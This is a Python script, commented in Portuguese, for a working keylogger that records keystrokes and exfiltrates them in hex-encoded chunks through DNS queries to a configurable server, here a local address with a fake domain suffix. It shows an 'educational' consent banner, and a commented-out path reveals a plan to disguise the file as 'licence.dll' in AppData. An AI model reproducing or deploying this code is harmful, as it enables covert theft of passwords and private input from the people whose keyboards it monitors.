###############################################################
# Imports
###############################################################
import socket
import random
import sys, os, time
from pynput import keyboard
from dnslib import DNSRecord

###############################################################
# Vars. Global
###############################################################
# Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
# _NAME = 'licence.dll'

# Futuramente podemos passar essas VARs global para dentro das funções
# está aqui apenas para facilitar as alterações
_DNS_ADDR = ('127.0.0.1', 9953)
_FAKE_DOMAIN = '.fake-domain.com.'
_KEYS = []
_USR_HAS = None
_COR = {
        'limpa':'\033[m',
        'red':'\033[31m',
        'green':'\033[32m',
        'yellow':'\033[33m'
    }

###############################################################
# Classes e Funções
###############################################################
def limpar_tela():
    if 'linux' in sys.platform:
        os.system('clear')
    elif 'win' in sys.platform:
        os.system('cls')

def alert_run():
    limpar_tela()
    print(f'''
    {_COR['red']}
    ╦╔═┌─┐┬ ┬┬  ┌─┐┌─┐┌─┐┌─┐┬─┐
    ╠╩╗├┤ └┬┘│  │ ││ ┬│ ┬├┤ ├┬┘
    ╩ ╩└─┘ ┴ ┴─┘└─┘└─┘└─┘└─┘┴└─
    ╔═╗┬  ┌─┐┬─┐┌┬┐            
    ╠═╣│  ├┤ ├┬┘ │             
    ╩ ╩┴─┘└─┘┴└─ ┴             
    ########################### ALERTA #################################
    # Esta ferramenta é destinada exclusivamente para fins educativos  #
    # e de conscientização sobre os perigos do utilizar soluções não   #
    # licenciadas (crackeadas). O uso desta ferramenta em ambientes    #
    # não autorizados ou para atividades maliciosas é estritamente:    #
    #                          >>> PROIBIDO <<<                        #
    ####################################################################
    # Ao executar esta ferramenta, você dará acesso irrestrito ao      #
    # "outro lado" aos eventos de Input/Output do seu sistema op.      #
    # Se você não está em um ambiente controlado ou não sabe do que    #
    # esse software se trata, por gentileza NÃO O EXECUTE.             #
    ########################### ALERTA #################################''')
    consentimento = input(f'''{_COR['limpa']}Concorda? (sim ou nao)> {_COR['limpa']}''')

    if consentimento == 'sim':
        print(f'''{_COR['yellow']}Carregando...{_COR['limpa']}''')
        time.sleep(1)
        limpar_tela()
        print('Keylogger executando... \n Precione "ESC" para fecha-lo!')
        pass
    else:
        sys.exit()

def hash_adler32(data):
    a = 1
    size = len(data)
    b = size % 35

    for ch in data:
        a = a + ord(ch) % 35
        b = b + size * ord(ch) % 35

    return hex(b * 35 + a)[2:]

def send_data(data):
    '''
    Recebe os dados e os envia usando requisições DNS
    de 63 em 63 bytes.

    Parameters:
        data (str): Data que iremos enviar
    
    Returns:
        None    
    '''
    global _DNS_ADDR, _FAKE_DOMAIN

    payload = ''.join([hex(ord(c)) for c in data]) # ord() no c
    payload = payload.replace('0x', '')
    request = str(payload) + str(_FAKE_DOMAIN)
    
    # Cria a requisição DNS
    domain = DNSRecord.question(request)

    # Envia a requisição DNS para o servidor
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3.0)
        sock.sendto(domain.pack(), _DNS_ADDR)
        _ = sock.recvfrom(512)
    except:
        pass

def on_release(key):
    global _KEYS, _USR_HAS

    # Verifico se já está no tamanho de mandar o pacote DNS
    # 31 pois temos que converter para Hex, totalizando 62
    if len(_KEYS) >= (31 - len(_USR_HAS)):
        for ch in _USR_HAS:
            _KEYS.insert(0, ch)
        send_data(_KEYS)
        _KEYS = []

    # Condição de parada
    if key == keyboard.Key.esc:
        return False
    
    # Trato teclas / numeros
    try:
        if key.char != None:
            _KEYS.append(key.char) # ord()
            # print(key.char)

        else:
            if '<96>' == str(key):
                _KEYS.append('0')
            elif '<97>' == str(key):
                _KEYS.append('1')
            elif '<98>' == str(key):
                _KEYS.append('2')
            elif '<99>' == str(key):
                _KEYS.append('3')
            elif '<100>' == str(key):
                _KEYS.append('4')
            elif '<101>' == str(key):
                _KEYS.append('5')
            elif '<102>' == str(key):
                _KEYS.append('6')
            elif '<103>' == str(key):
                _KEYS.append('7')
            elif '<104>' == str(key):
                _KEYS.append('8')
            elif '<105>' == str(key):
                _KEYS.append('9')
                
            # todo o resto que não tratei
            # else:
                # print(f'Não consegui identificar: {key}')

    # Trato se for algum caractere especial
    except AttributeError:
        if str(key) == 'Key.space' or \
            str(key) == 'Key.enter' or \
            str(key) == 'Key.tab':
            _KEYS.append(' ')

        elif str(key) == 'Key.backspace':
            if _KEYS:
                _KEYS.pop(-1)

        # else:
            # print(f'Não tenho tratamento para isso: {key}')

###############################################################
# Main
###############################################################
if __name__ == "__main__":
    alert_run()
    # Gerando nome aleatório
    _USR_HAS = [char for char in hash_adler32(str(random.randint(100, 999)))]

    # Iniciando Keylogger
    lst = keyboard.Listener(on_release=on_release)
    lst.start()
    lst.join()
